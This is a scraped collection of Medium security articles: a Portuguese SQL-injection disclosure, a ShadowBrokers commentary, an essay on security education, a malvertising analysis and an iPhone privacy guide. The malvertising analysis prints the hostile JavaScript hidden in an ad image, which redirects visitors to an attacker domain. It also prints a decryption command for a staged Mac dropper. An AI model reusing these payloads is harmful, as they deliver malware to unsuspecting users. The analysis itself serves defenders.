Eu não sou contra ter tabela com nomes óbvios: “usuario”, “desafio”, e etc. Fazem parte do dia-a-dia dos desenvolvedores e são necessárias para um desenvolvimento ágil da aplicação, então não tenho nada a comentar sobre.
Eu sou a favor de criar todos os bloqueios possíveis para impedir que um invasor encoste em qualquer parte do banco, então não me importo com a nomenclatura das tabelas que usar.
Pude executar uma série de comandos. Muito provavelmente eu poderia ter realizado algo grave como um UPDATE na pontuação de algum participante ou DELETE no desafio de alguém. Não tentei esses comandos, pois caso funcionasse eu não saberia como retornar ao valor inicial. Se essa suposição estiver correta (como as minhas suposições anteriores estavam) isso seria um grande problema.
Sempre que fizer uma pequena aplicação com um propósito específico (como um microservice) e esta aplicação tiver acesso ao banco de dados, tenha um usuário para a aplicação com políticas de acesso o mais limitadas possível.
Claramente, o único propósito dessa aplicação é retornar se um participante finalizou o desafio. Logo, deveria haver um usuário no banco com permissões de APENAS SELECT NAS TABELAS USUARIO E PROGRESSO_DESAFIO.
Dessa forma eu sofreria para descobrir as demais tabelas, (já que as tabelas information_schema.columns e pg_catalog.pg_tables seriam bloqueadas pra aplicação), não seria possível mudar ou deletar informações (caso possível) e a brecha seria bem menor.
Exceptions não são algo comum em aplicação nenhuma. Se um usuário tentar dividir por 0 em uma calculadora, ele espera que a calculadora informe algo como “impossível dividir por 0” ao invés de algo como “Exception thrown at X can’t divide by zero”. Você deve tratar todas as possibilidades de erro do seu código! Se uma aplicação começa a disparar várias exceptions (como eu intencionalmente causei em passos anteriores) deve haver alguma forma de alerta (indico uma ferramenta como https://sentry.io) para que os desenvolvedores ajam rapido!
Eles poderiam ter verificado um aumento nos erros, ter verificado as mesmas exceptions que eu vi, e ao notar o comportamento estranho poderiam ter me interrompido antes de eu obter todos as informações que obtive acima.
Não, eles não vão usar sua aplicação como você espera.
Se o campo só permite números, ELES VÃO DIGITAR LETRAS.
Se o campo só permite CPF, eles vão tentar um comando SQL!
Esteja preparado, se só permite CPF. Valide que o CPF exista, garanta que não há nada diferente de digitos, filtre tudo que for diferente do que vocês espera.
SEMPRE filtre todo e qualquer comando que provém do usuário — não permita que ele tenha poder sobre a informação que chega até seu banco.
E para finalizar com chave de ouro, torno a repetir a lição mais preciosa (e mais cara) que tornou possível prosseguir com a brecha:
Gere logs de erros para consumo interno dos desenvolvedores — Nunca exponha exceptions e stacktraces.
Seria tão desanimador se ao tentar a primeira SQL Injection eu tivesse recebido um 404 sem graça como é agora.
Neste momento já tenho informações suficientes para dizer que a brecha é gravíssima e expõe demais os participantes da maratona.
Agradeço aos responsáveis da maratona pela rapida correção (foi corrigido no dia seguinte).
E por fim, claramente com 30 pontos não irei ganhar a maratona � fica pra próxima.
Written by
","['Security', 'Cybersecurity', 'IBM', 'Hackathons', 'Hacking']"
Completely Wrong - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/completely-wrong-a300246ad316?source=tag_archive---------1-----------------------,"A well respected author with a lot of knowledge of the NSA has written an article for Reuters speculating that the ShadowBrokers “leak” was from “another Snowden.” It was not. Although I respect the work that Mr Bamford has done in the past in analysing the NSA, his Reuter’s article is littered with half truths, omissions and faulty analysis.
[Ed: I wanted to do a line by line annotation using Genius, but was unable to get it to work. Unfortunate, since that seems more appropriate given the number of problems with the article.]
Every quote is from the original article. I’ve added emphasis to the parts I will discuss.
Where the Watergate burglars came away empty-handed and in handcuffs, the modern- day cyber thieves walked away with tens of thousands of sensitive political documents and are still unidentified.
Now, in the latest twist, hacking tools themselves, likely stolen from the National Security Agency, are on the digital auction block. Once again, the usual suspects start with Russia — though there seems little evidence backing up the accusation.
The Auction Fallacy
Absence of Evidence is Evidence of Absence
In addition, if Russia had stolen the hacking tools, it would be senseless to publicize the theft, let alone put them up for sale. It would be like a safecracker stealing the combination to a bank vault and putting it on Facebook. Once revealed, companies and governments would patch their firewalls, just as the bank would change its combination.
Senseless To Who?
They Are Not Up For Sale
See, It Is Not Senseless
A more logical explanation could also be insider theft. If that’s the case, it’s one more reason to question the usefulness of an agency that secretly collects private information on millions of Americans but can’t keep its most valuable data from being stolen, or as it appears in this case, being used against us.
Thats A Lot of Asses Out Of U and Me
Ops Kits Are Not Particularly Valuable
NSA Needs To Stop Writing Cisco’s Buggy Code
While the “auction” seemed tongue in cheek, more like hacktivists than Russian high command, the sample documents were almost certainly real.
The most valuable are “zero day” exploits, meaning there have been zero days since Windows has discovered the “crack” in their programs.
The reasons given for laying the blame on Russia appear less convincing, however. “This is probably some Russian mind game, down to the bogus accent,” James A. Lewis, a computer expert at the Center for Strategic and International Studies, a Washington think tank, told the New York Times. Why the Russians would engage in such a mind game, he never explained.
Rather than the NSA hacking tools being snatched as a result of a sophisticated cyber operation by Russia or some other nation, it seems more likely that an employee stole them. Experts who have analyzed the files suspect that they date to October 2013, five months after Edward Snowden left his contractor position with the NSA and fled to Hong Kong carrying flash drives containing hundreds of thousands of pages of NSA documents.
Sophisticate Cyber Operations Are What Russia Does
Good Luck Smuggling A USB Out Post-Snowden
Consisting of about 300 megabytes of code, the tools could easily and quickly be transferred to a flash drive. But unlike the catalog, the tools themselves — thousands of ones and zeros — would have been useless if leaked to a publication. This could be one reason why they have not emerged until now.
There follows a long section where Bamford establishes that Assange was used as a cut out to launder the DNC emails hacked by the Russians. We get it mate, we know that Wikileaks is used as a cut out to launder hacked content, that is literally the reason it exists. This section includes a long bit about the ANT catalog and why Bamford believes it came from Wikileaks. How establishing that Assange was used as a Russian cut out makes it less likely that Russia stole the ops kit (which wasn’t even leaked by Wikileaks), “he never explain[s].” I am honestly baffled.
Bamford then links Assange to Appelbaum, and pivots into bizarre conspiracy land (minus any actual conspiracy.)
In addition to WikiLeaks, for years Appelbaum worked for Tor, an organization focused on providing its customers anonymity on the Internet. But last May, he stepped down as a result of “serious, public allegations of sexual mistreatment” made by unnamed victims, according to a statement put out by Tor. Appelbaum has denied the charges.
At about the halfway mark I can no longer stand the level of BS in the article. It has simply overwhelmed my capacity to handle “wrong!” The only thing I’ll note is that the quality of the analysis, and rhetoric, does not improve in the rest of the piece.
If there is an argument to be made that the ShadowBroker’s files were sourced from HUMINT, this article is not it.
Reuters should retract the article.
See also: ShadowBroker Breakdown, my analysis of the currently available data on the source of the firewall ops kit.
Update: Bamford has responded with a rebuttal.
Written by
","['Guccifer 2.0', 'here', 'here', 'here', 'here', 'here', 'here', 'daveaitel', 'Source', 'daveaitel', 'cybersec politics', '100,000 routers', 'ShadowBroker Breakdown', 'daveaitel', 'Leigh Honeywell', 'Cybersecurity', 'Security', 'Shadowbrokers']"
Computer Security Education - Julian Cohen - Medium,https://medium.com/@HockeyInJune/computer-security-education-827b29ca72fe?source=tag_archive---------8-----------------------,"I can distinctly recall a day in elementary school when I had a sudden moment of clarity — that homework was a thing that I didn’t have to do. Since that day, I’ve mostly taken my education into my own hands. When I want to learn something, I figure out where the best resources are and I learn it.
This is common in the security industry, where most professionals and experts are self-taught and our best research develops out of a weekend project.
“I have never let my schooling interfere with my education.” — Mark Twain
Security education is a topic that we hear about a lot — from employers not being able to hire anyone (pdf) to the notion that there are going to be 1 million new computer security jobs this year. The only conclusion we can draw from these kinds of articles is that organizations are having a hard time hiring competent computer security professionals.
I suspect the root cause of this problem is not that students and professionals aren’t interested in computer security, but because it is so hard to be sufficiently educated in computer security.
At the bottom of this article, I propose a university curriculum that can educate students despite these issues.
tl;dr: Universities have bad degrees, bad courses, bad teachers, and provide no way to tell the difference between them.
Students who go to school for computer security (often under Information Assurance, Information Systems, or Cybersecurity Management degrees) are rarely taught the skills they need to succeed. This is because the curriculum is often designed and taught by professors who have never been formally trained in computer security and have never professionally worked in computer security.
While most fields have a similar problem, some have worked around them by influencing curriculum from external organizations. For instance, the American Medical Association requires that students go to an accredited medical school, complete a medical licensing exam, and complete a residency before becoming a doctor. The American Bar Association requires that students pass the Bar exam before becoming a lawyer.
This isn’t the fault of universities — computer security is such a young field that even if we date its birth from the first public record of where memory corruption was theorized to result in arbitrary code execution in 1972, the security field is only 44 years old in 2016. That’s barely long enough for the first generation of security professionals to retire and become professors. Additionally, modern computer security curriculum has only been around for less than a decade — not long enough for universities to receive actionable feedback about the curriculum.
Most students who know they want to study computer security, use the NSA’s Centers of Academic Excellence list of designated institutions to look for potential universities. Unfortunately, the way schools get awarded an NSA CAE designation is the same way PCI audits are done — checklists.
On their website, the NSA has a list of requirements your university degree program must meet to become a center of academic excellence. But these requirements are simply a list of topics to cover that rarely goes into meaningful detail and often references obscure, obsolete documents as textbooks such as The Protection of Information in Computer Systems (Saltzer an Schroeder, 1975) and The Trusted Computer System Evaluation Criteria (The “Orange Book”) from 1985 (both referenced in the NSA CAE IA/CD Knowledge Units document). They even provide you with a spreadsheet you can fill out to make sure that your curriculum covers their arbitrary, ineffective checklist.
It’s not simply that the process is bad, it’s that it’s very difficult to tell different schools apart. Students should be able to identify the strengths and weaknesses of individual schools and compare them in specific concentrations that students want to study. The NSA center of academic excellence designation gives no way for students to do that.
tl;dr: Certifications and trainings have bad instructors, bad materials, perverse incentives, and provide students no way to figure out which is best for them.
No matter how you feel about computer security certifications, you probably agree that course instructors are not paid fairly, which leads to a constant decrease in quality of instructors. When these courses are hands-on or exercise-based, an instructor who really understands the material is critical so students understand the full context of the skill rather than following a series of steps.
A popular alternative to certifications are conference trainings (like those at BlackHat, Recon, and Infiltrate). This is the hardest of all the things I’ve mentioned so far in which to find faults. Conference trainings are usually the best training you can get, but they are often very expensive (on the order of several thousand dollars for a day or two) and they can vary widely in quality.
Certification and training organizations are often incentivized to overcharge and cut corners. Cheaper instructors means thicker margins. Students are asked to pay for everything on top of the course — textbooks, tests, and worst of all, renewal fees.
Certification and training organizations are also incentivized to not grade students fairly. When certifications or trainings are purchased in bulk by an organization attempting to train its employees, these organizations are incentivized to make sure almost everyone successfully passes the course. This keeps the students and their employers happy and more likely to be repeat customers.
Individuals looking to continue their education are often frustrated when trying to evaluate which course or training is best for them. Only someone who has already taken the program or is an expert in the subject can properly judge applicability and quality, because there is no independent organization that vets courses and trainings, the only way to differentiate these courses is through word of mouth and past reviews — which are often unreliable.
Because there will always be a shortage of great teachers and the relevant specifics that should be taught will always be changing, I suggest teaching computer security like mathematics is taught in the United States — where the science and concepts are taught and treated as important, but the part on which students are tested consists of specific, repeatable skills and exercises.
Students should learn specific skills, like reverse engineering, malware analysis, and vulnerability discovery. Everything else should come later, whether on the job, in higher education, or in some sort of residency.
In this way, everyone leaving school would have a reasonable set of useful skills that can be readily applied in almost every computer security position.
Here are a set of courses that I believe would best serve students in the field (These courses assume computer science competency):
Introduction to Systems — This course will teach students how different large, complex systems work and how to analyze different parts of them. I recommend teaching this course like a survey of systems, introducing students to a wide variety of different large, complex systems over the semester. Here some are potential examples:
Source Code Comprehension — This course will teach students how to read code as well as they write it, or better. Students will learn code comprehension tools and techniques. Assignments will be to read thousands to millions of lines of code and to answer specific, detailed questions.
Introduction to Reverse Engineering — This course will introduce students to taking apart a small, closed system and understanding it. Here some are example assignments:
Introduction to Post-Exploitation — Alternatively called Introduction to Networks, this course will teach students common methods of moving laterally around a network after initial compromise. It will cover topics like network scanning, local escalation of privilege, discovering high-value targets, and data exfiltration.
Introduction to Vulnerabilities — This course will simply introduce students to different kinds of vulnerabilities. It will focus on introducing students to new and different types of vulnerabilities. Students will learn how to identify vulnerabilities and understand their properties. Assignments will include discovering and exploiting vulnerabilities.
Introduction to Malware — This course will introduce students to analyzing and understanding malware. Exercises will be practical and will utilize real malware samples. Students will determine common tactics among different malware families and develop detection/prevention/monitoring techniques for them.
Introduction to Forensics — This course will introduce students to tools and techniques to understand and interpret operating system and application data structures (including file systems, configuration stores, and process memory). Assignments will include performing real investigations and writing custom tools to analyze specific data structures.
I truly believe that you get out of education what you put in. Until better education programs exist, either take your education into your own hands or take your time to find a program that fits your needs (this is an old post where I describe my methodology for picking a university to study security).
Thanks to Evan, Dino, Brad, Kelly, Andrew, Marc, and Justin.
Julian attended the NYU Polytechnic School of Engineering (now NYU Tandon) from 2009 to 2013. At NYU Engineering Julian taught Manual and Automatic Program Analysis in 2014 and a CTF Team Independent Study Class in 2011 designed to get intelligent students to work on practical security problems. Both classes were a huge success with many students open sourcing their projects and many students turning their projects into internships and jobs.
At NYU, Julian was best known for running the school’s ISIS Lab (now rebranded as the OSIRIS Lab) from 2010 to 2013. In his tenure there, he developed their internationally-recognized Hack Night training program, revamped the CSAW CTF competition into the largest CTF competition in the world during the 2012 calendar year, and mentored undergraduate and graduate students in developing practical security research.
Written by
","['Education', 'Education Reform', 'Cybersecurity', 'Security', 'Higher Education']"
Confiant & Malwarebytes Uncover Steganography Based Ad Payload That Drops Shlayer Trojan On Mac Users,https://blog.confiant.com/confiant-malwarebytes-uncover-steganography-based-ad-payload-that-drops-shlayer-trojan-on-mac-cd31e885c202?source=tag_archive---------2-----------------------,"Recent months have seen an uptick in reports of JavaScript malware that hides in image files. This is often referred to as “image based malware” or “steganography malware” in more technical contexts.
noun: steganographythe practice of concealing messages or information within other nonsecret text or data.
This post will examine a steganography based payload utilized by a malvertiser that Confiant have dubbed VeryMal after one of their ad serving domains, veryield-malyst.com. Malwarebytes provided an analysis of the malicious binary that was dropped. It’s estimated based on the scope of our coverage that as many as 5MM visitors maybe have been subject to this recent malware campaign.
The result of the fully executed payload is this familiar browser hijack:
Much of the buzz around these types of attacks will have you believe that the image file alone is the threat and that we now have to fear the images that our browsers load during day to day web surfing, but this is a departure from the truth. Validating the integrity of individual image files served in ads makes little sense within the broader context of the execution of these payloads.
In fact, the steganography comes into play in order to deliver only part of the payload, and the image needs to be processed in order for that piece to be extracted and then utilized. The image alone will not harm your computer or redirect your browser.
Let’s look at the code:
If translated to plain english, the code would look something like this:
Images, loosely speaking, utilize non-executable file formats for storing compressed data. When a browser or other image viewer of your choice loads the image file, it basically uncompresses the file and uses the data to paint the image one pixel at a time. The “malicious” image above looks like this in a hex editor:
Much the same way as an image viewer needs to uncompress this data in order to render the final result, web developers are able to do their own low-level manipulations of image data using JavaScript and the HTML5 Canvas API.
The data manipulation happens in just a handful of lines of code:
The image itself is just small, white bar:
The hidden code, once extracted from the image, will look like this:
top.location.href =’hxxp://veryield-malyst.com/’ + volton + ‘?var1=’ + wsw;
Here it is with the parameters populated:
hxxp://veryield-malyst.com/154c8e99-aad0–4658-b5fb-645c751ad42b?var1=10512
As malvertising detection continues to mature, sophisticated attackers are starting to learn that obvious methods of obfuscation are no longer getting the job done. The output of common JavaScript obfuscators is a very particular type of gibberish that can easily be recognized by the naked eye. Techniques like steganography are useful for smuggling payloads without relying on hex encoded strings or bulky lookup tables.
The `veryield-malyst` domain, as a case in point, has been active for months, but only recently are VeryMal starting to smuggle it using steganography. Here’s one of their tags ad tags from early November for comparison:
The simplicity is always better illustrated with a translation to english:
hxxps://79d5e561–1a8d-48f6-abdb-495df89ec5e.s3.amazonaws.com/csqc.js
And the code there is of course familiar:
top.location.href = ""hxxp://veryield-malyst.com/f7e156be-fc09-4b1b-a052-d48d2aac69fc?var1="" + kk
VeryMal has run multiple campaigns in waves utilizing the veryield-malyst domain as their redirector since August of last year — this recent one being the most notable due to the steganography that was leveraged for client-side obfuscation.
The campaign was active from 1/11/2019 to 1/13/2019 on two top-tier exchanges that represent ~25% of top 100 publisher sites.
Confiant detected and blocked 191,970 impressions across our publisher customers. Only US visitors were targeted.
VeryMal also had significant end of year activity in December.
VeryMal utilizes HTTP 302 redirects through their veryield-malyst.com domain to adpiano.com — a little known platform with contact information in Cyprus. Adpiano acts as a click tracker for these campaigns and other malvertisements including but not limited to:
- morningflashsee.club- bestadbid.com- newadvancetypeliteflash.services- doconcretegreatliteflash.icu- firstfetchflash.club- windowinstalldealaflash.icu- upgradebestfinishtheclicks.icu- booe.pro- freecalculation.com
Forced redirections are not the only attack vector for these bad actors, as they’ve been observed to brazenly run display ads for their malware installers under the guise of Flash updates and PC repair software. Creative samples from the December campaign include the following:
The recent VeryMal campaign leveraged the following (still active) click tracker in their redirect chain in order to drop the fake Flash update:
hxxps://cs.adpiano.com/kokodzbambo/aaoaeeea/?utm_source=1236&utm_campaign=1616984&aff_sub=w3SGFK32C602JCMJHKLPR5FC&clck=w3SGFK32C602JCMJHKLPR5FC&sid=w3SGFK32C602JCMJHKLPR5FC
Landing pages for this campaign rotate through an eclectic collection of .icu domains like the following:
mixmaintenancegreatliteflash.icumediafreshgreatliteflash.icu
It’s unclear how many there are in total or how frequently they are rotated, as the campaigns themselves target specific platforms and messaging. The content for this report was collected via Google Chrome on Mac OS.
All of the landing pages have been observed to force the download of a file named AdobeFlashPlayerInstaller.iso
Virus Total:
https://www.virustotal.com/#/file/75426777c469dbce816dc197b5bef518f4eca577e9c53e4679d81db2780a262f/detection
Adam Thomas (@adamt5Six) from Malwarebytes was kind enough to provide further analysis of the binary, which follows below. Thanks Adam!
Sample name: AdobeFlashPlayerInstaller.iso
SHA-256: 75426777c469dbce816dc197b5bef518f4eca577e9c53e4679d81db2780a262f
File Type: Macintosh Disk Image
Digital signature: 2J5Q8FU8C6 (Apple Team ID)
Instead of the normal mach-o (Mac binary) contained within an application package, we find here instead a shell script. The script decrypts an AES-256 encrypted file contained within the Application Resources directory:
First, we have to remove the base64 encoding from the file:
$ openssl enc -d -aes-256-cbc -nosalt -pass pass:5683436752 -in enc.out -out enc.out.bin
After removing the encoding and decrypting with openssl, we see a readable script:
The script works to remove another layer of base64 encoding leaving us with strings of characters in hex format:
The script then converts the hex to ASCII format revealing another script and the final layer of our 1st stage downloader. A password protected ZIP file is downloaded and executed:
There are additional requests for scripts that occur after the execution of the payload that are believed to help render the installation screen for the adware dropper. Chances are that they also function to automatically click through the adware installer.
Malwarebytes have also been able to provide some additional visibility into the inner workings of this bad actor’s MO from findings they have gathered via analysis of tangential Windows based malware. The initial .icu domain performs a 302 redirect to another .icu that starts with www2.
The attacker infrastructure constitutes mostly of .icu domains that are created by the dozens and move around the AWS IP space. The URLs are generated with specific parameters and often with a very short TTL.
A small sample follows below:
whenupgrade.yourbestsiteforlinksitenew.xyzworkingversion.theperfectupdate4everyone.xyzwww.checkdealgoldliteflash.icuwww.fasterdltypeliteflash.icuwww.fixmaintainbestaflash.icuwww.makebestmaintainaflash.icuwww.midgreatdlliteflash.icuwww.mixmaintainbestaflash.icuwww.savegolddealliteflash.icuwww.smallbestappleliteflash.serviceswww.topfuturetypeaflash.icuwww.upgradedltypeliteflash.icu
Windows installer VirusTotal:
https://www.virustotal.com/#/file/6efb37adef3ae68cc3d7cc0512ae82eab4a39b1880e00412ce50f5c423eba00d/detection
Based on the volumes Confiant observed, at its peak the full scale of this specific attack triggered over 5 million times per day. The revenue impact of those 5 million malicious impressions needs to be measured from a multitude of different facets. You have the publisher who loses money directly from the interrupted user sessions, and loses future money from the increased ad blocking usage and user trust loss. There are the ad exchanges who had their inventory access cut off while they battled the infection and will have had some publishers pull their inventory out permanently. The advertisers will get hit with the resulting ad fraud from the infected devices. And let’s not disregard the user, who now has an infected device. Estimated all together, Confiant benchmarks the cost impact for just that Jan 11th peak alone to have been over $1.2 million. When you consider that this was just one of multiple hundreds attacks Confiant has caught and blocked over the past month alone, the scale of the issues facing the digital ad industry becomes clearer.
Written by
","['Malware', 'Advertising', 'JavaScript', 'Cybersecurity', 'Infosec']"
Configuring Your iPhone for Maximum Privacy and Security: Web Browsing,https://medium.com/better-humans/configuring-your-iphone-for-maximum-internet-privacy-and-security-web-browsing-a7e72ecbf090?source=tag_archive---------0-----------------------,"During my 25-year career in the world of tech, I’ve worked as a systems administrator, overseeing software and hardware rollouts of Apple products. I was fortunate enough to do this incredibly detailed work at some of the largest nonprofits and Fortune 500 companies on the planet, including the Getty Center and Nike. Along the way, I also started writing about technology, but instead of writing about tech for other technologists, I became a columnist on tech security for regular folks.
In this article, it’s my goal to help you focus on security and privacy (two different but equally important matters) on the iPhone, specifically with regard to your phone’s data connection—the internet connection you use for surfing the web or using apps. (This article does not cover the issues of securing your text messages, phone calls, or data embedded in posts you make, or physically protecting your phone—those are topics we’ll cover in the future.)
I’ll start — as I usually do — with this caveat: there is no such thing as perfect security or perfect privacy online, only best practices and best tools. Anyone who promises you otherwise is lying or ignorant. Don’t buy their snake oil! Instead, arm yourself with knowledge backed by fact and personal discovery.
Browsing the web and using apps are two of the easiest ways to find information—but being online is also one of the easiest ways for your every digital move to be tracked. Every time you visit a website, a small army of cookies, trackers, and little pieces of embedded code watch what you do, follow you to other websites, and capture information about you to help serve you ads. Other information about us — data that perhaps we’d prefer not to share — is also available in those cookies, including our location, IP address, and computer platform or operating system.
I’m sorry, but I don’t want that information shared with the world — by default?!? — so I call BS. It’s time to arm ourselves with tools we can use to help set up and then automate a more secure internet experience. Here’s how to start.
I’ve written extensively about the need to use a VPN for a good reason: a VPN (or “virtual private network”) provides a secure connection to the internet by hiding your IP address — your unique identification number — and encrypting the data you send and receive while online.
That makes it the quickest, easiest, and most powerful tool to implement in your privacy and security arsenal.
Even as a law-abiding citizen in a democratic nation, I’m against AT&T, Verizon, Sprint, or any cellular network provider tracking where I surf online and when. That’s just creepy. Without a VPN, those companies have access to all of this information, they keep logs on it, and, if subpoenaed by federal agencies, they are mandated to surrender that information about me.
No thank you!
When using a VPN, that web-surfing information is hidden from them: instead, all they can see are the timestamps of your connections to the VPN provider. The VPN hides your IP no matter how you connect to the internet, whether it’s via a browser or via an app that accesses the web.
VPNs are useful in another way that you might find helpful if you travel. Your VPN app will give you a choice of servers to connect to the internet through. If you connect to a server in Los Angeles, you will appear to be connecting from Los Angeles … even if you’re sitting in Ghana or Mongolia. So if the website you’re using blocks you based on location, you can simply connect to a server somewhere else to get around it.
There are many VPN providers vying for your money, and it’s important that the one you choose actually be secure. I have ten strict guidelines for the VPN companies I recommend (which you can read in full here), but in summary, I only recommend VPN providers who:
If you take the time to do the research, you’ll discover that only a few VPN companies actually provide all of those core services. I personally use NordVPN, which is headquartered in Panama and constantly ranked in most reviewers’ top 10 lists. Whether you choose this company or any of the other VPN providers I discuss in my longer article isn’t important. What is important is that you pick one that meets high security and privacy standards.
No matter which VPN provider you use, once you’ve downloaded and installed your VPN app, you should do the following:
The biggest disadvantage to using a VPN is that your surfing speeds will be slower. The amount of slowdown you will experience depends on several factors, including speed of the VPN server, the time of day, the server traffic load, your normal surfing speed, and the country where the VPN server is located. In general, if you’re connecting to a server in a well-connected country — and as you can see in the screenshots below, I’m in the US and connecting to a VPN server that’s also in the US — you shouldn’t experience much slowdown, especially if you’re using a reputable VPN provider.
If you do run into issues of slowness when using a VPN app that previously worked, there are a few things you can try to fix it:
I personally keep my VPN on at all times. That keeps me safe and secure no matter what I’m doing online. However, if you’re experiencing slowdowns that you just can’t seem to fix, then at a minimum, endure it and use your VPN for any online transactions that you wouldn’t want to be published in national newspapers. For casual surfing that doesn’t include providing critical info such as usernames and passwords, Social Security numbers, or credit card or banking information, you can consider surfing without your VPN activated. But it’s almost impossible to always remember to switch back and forth, so this is risky.
Safari, by a long shot, is the most popular browser on the iPhone. But no matter how committed Apple is to promoting privacy and security in its ecosystem of hardware and software, it can’t make the entire internet safe because: #impossible.
Like most browsers, Safari still loads ads, trackers, and cookies, even in its awesome Reader Mode. Those extra pieces of code not only make websites slower to load but track us wherever we go online. They also use up data on our mobile data plans, so, uh, yeah: not cool.
The same goes for Google’s Chrome browser, even in its “incognito mode,” which — basically — purports to hide your browsing habits, account info, and passwords. But recently researchers found that there are serious leaks in this “privacy” feature.
I now almost exclusively use the Brave web browser on my iPhone, as well as on all of my other computers. Brave is 100% free and simple to use, and it offers the easy ability to block cookies, tracking software, and intrusive ads. As a result, it’s also blazingly fast compared to the competition.
After installing, tap the orange Brave logo in the upper-right corner of the app window to open the easy-to-use controls. I always have the “Block Ads & Tracking” and “Block Phishing” controls activated. When I need 100% blockage, I activate the other two blockers as well, but be warned: that forces some websites — usually the ones that have the most trackers — to either load differently or not load at all.
Most news websites — because of how many ads and trackers they all have — provide a great test of how applying Brave’s different settings affects what you see. Here are some examples of browsing CNN’s homepage on Brave with different levels of blocking enabled (settings on top row, results on the bottom):
In the first example on the left, you can see how CNN loads normally, including the truck advertisement. At center, you can see that I’ve tapped on the Brave logo and activated two blockers. When I do, Brave immediately reloads the webpage and shows me that 43 ads and trackers have been blocked. As a result, the website now loads without the truck ad. On the right, I’ve activated too many of Brave’s blockers, and you can see just how different the page looks—just a list of clickable category words. Given how nutty the news is these days … this might be an improvement for you. �
Three final notes on using Brave:
In 2002, the nonprofit Tor Project created a unique network along with a companion web browser for surfing the web via that network. The Onion Router (or “Tor”) is a complex system of computer relays and encryption schemes that creates many layers (like an onion!) of obfuscation that make it nearly impossible to track someone using it.
Tor evolved from research at the United States Research Laboratory in the 1990s for use by US intelligence agencies. In fact, according to the nonprofit, “a branch of the U.S. Navy uses Tor for open source intelligence gathering.” Perhaps that’s why the National Security Agency — an agency known for hacking every system and platform on the planet — considers Tor “the king of high-secure, low-latency internet anonymity.” Translation: It’s a super effective tool that citizens can also use to help protect their privacy while online.
There’s only one authorized Tor client for iOS: the Onion Browser. There are other Tor browsers available, of course, some of which have even been well reviewed. However, none of those have the stamp of approval from the Tor Project. But no matter which Tor client you end up choosing, expect to surf much more slowly.
Tor’s greatest asset — bouncing through various relay servers to hide your identity and location — is also its greatest liability: surfing the web will be slower. But that’s a worthwhile trade-off if you are engaged in important private or secret communication and research on the web. Better slow than sorry.
Below you can see the homepage for Tor (left), viewing the NYTimes .onion page along with its page stats (center), and how Tor keeps you safe by disconnecting you if you stop browsing for a few moments (right).
Although Tor is secure enough for the US government to use, security professionals rightly point out that even Tor has caveats, just like any other platform or technology. The two most glaring are:
This is why some people who prefer extreme privacy or security choose to combine BOTH Tor and VPN at the same time.
In the Tor-over-VPN strategy, users first connect to their VPN provider and then to the Tor network. This approach, shown below, is often thought to provide better security because no one — except the VPN provider — knows your actual IP address or that you’re even connecting to the Tor network. (And remember, a good VPN provider keeps no logs on users.)
In the VPN-over-Tor approach, the setup is the opposite: users first connect to the Tor network and then to their VPN. That solution is often thought to provide better anonymity.
A small group of VPN providers — NordVPN among them — have the ability to route your data directly to the Tor network via their VPN servers, as shown. Because those VPN servers use a different IP address than your personal computer, your Tor entry node is blocked from knowing your IP, eliminating one of the two security holes in Tor.
This approach is also thought to provide better anonymity because all data — even data coming out of the Tor network — remains encrypted because of your VPN provider.
Decrypted data can lead to big losses. One notable example: In 2007, a Swedish computer security expert set up five Tor exit nodes in various locations around the globe as an experiment and then used them to intercept and harvest usernames and passwords for email accounts, private emails from those accounts, and more. What this researcher pointed out was how easy it was to hack even the notoriously secure Tor network.
If you’re using Tor with a VPN for better security, you should take two more steps to lock things down. The first requires you to adopt one tool, and the second to change one behavior:
Using the “Onion Over VPN” feature of Nord is simple: launch the app, slide up the server list from the bottom of the screen, tap “Specialty Servers,” and then tap “Onion Over VPN.”
Once connected, fire up your favorite browser to surf the “normal” web or fire up the Onion Browser for super safe surfing.
It’s no secret that Google’s core services are free because you, my dear friend, are the company’s product. Google collects data about you and then uses that data to charge others to show you specific ads.
It’s very lucrative and works because every search you make, every map location you navigate to, and seemingly every move you make, Google tracks you.
The way I prevent this is to use other search engines that don’t track me.
Which ones don’t track users, you ask? On my iPhone and computers, I now exclusively use DuckDuckGo as my search engine. I also use its app on my iPhone because it’s not only a simple portal into the search engine but also a fairly great web browser with some pretty kickass tracker blocking.
Your history is saved in the app, but if you just click on the fire icon at the bottom center of the app, it will erase your browsing history.
There are other alternative search engines. Tech experts and cybersecurity fans alike each have their own take on which search engine to use, and, frankly, it’s a worthwhile debate.
DuckDuckGo provides increased privacy from overreaching companies like Google, but not security protection from the US government. DuckDuckGo is a US company, so both the company and its servers are subject to US law. They must therefore provide any data they have to the government if asked. That might cause some of you to seek another search engine, and if that’s the case, I don’t blame you. Not wanting your government to have records of every online search you make is a legitimate concern, even for law-abiding citizens.
If you do prefer your search results free from US government oversight, then the current frontrunner is StartPage, based in the Netherlands. What’s curious is that this company pays Google for its search results: it submits your search queries anonymously minus any metadata — including your IP address — and then serves them to you. Neato!
So you’ve taken some of the steps that I’ve outlined. Good. But you shouldn’t trust me: I’m a stranger, and, as your parents already taught you, never trust a stranger. Instead, learn how to prove that what I’ve recommended is actually working!
To do that, you’ll need your IP address. On your iPhone, tap through to Settings -> WiFi and then tap once on the name of the network to which you’re currently connected. Find your IP address listed there. In my case, you can see that my WiFi network name is “secret garden” and my IP address is 192.168.2.104. For the moment, we’ll refer to this as our “private” IP address.
Clearly, we don’t want the rest of the world to know our private information, so let’s open our VPN app, connect to a server of our choice, and see what happens. In my case, I’ll open NordVPN and connect to a US server. Once I’m connected, my app shows a green color at the top, along with the name of the country/server to which I’ve connected. If I tap on that server, my new “public IP” is revealed. In this case: 104.128.136.58. We say “public” IP because — once your VPN is active — no one should see your actual IP address.
Now let’s see what the rest of the world sees when you’re surfing the web. Once your VPN is active, go to https://ipleak.net/.
Things you’ll want to check when you visit this testing website include:
If your public IP address is showing and your geolocation is tagged as where your VPN server is located, you’re being protected in ways that you weren’t without your VPN! It’s also worth noting how much OTHER information can be gleaned about you just by surfing online: the web browser you’re using, the operating system you’re using, information about the computer/phone you’re using, and more. So you see: even just casual surfing online reveals a lot of information about your location, your computer, and — if your browser history is available — you as a person.
Fun, bonus assignment: What happens if you choose to connect to Nord’s “Onion Over VPN” server option? Notice any differences as to the information that gets revealed? Now what if you run the same tests via the Onion Browser? You’ll notice that every layer of protection that you add — VPN, Onion Over VPN, Onion Browser — provides you with additional layers of privacy.
So that’s the scoop on data privacy. I’m a big fan of Coach Tony’s philosophy of configuring the iPhone’s home screen for optimal focus. Here’s what mine looks like now. You’ll notice that I keep my VPN, browser, and search engine apps front and center:
